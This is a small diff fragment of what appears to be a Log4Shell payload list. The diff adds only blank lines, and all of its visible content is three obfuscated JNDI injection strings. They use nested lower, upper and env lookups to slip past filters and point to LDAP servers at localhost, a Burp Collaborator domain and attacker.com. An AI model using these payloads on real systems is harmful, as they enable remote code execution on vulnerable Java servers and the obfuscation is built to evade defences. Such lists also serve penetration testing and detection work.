@@ -23,3 +23,5 @@ ${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce}
 ${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//your.burpcollaborator.net/a}
 ${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}
 ```
+
+
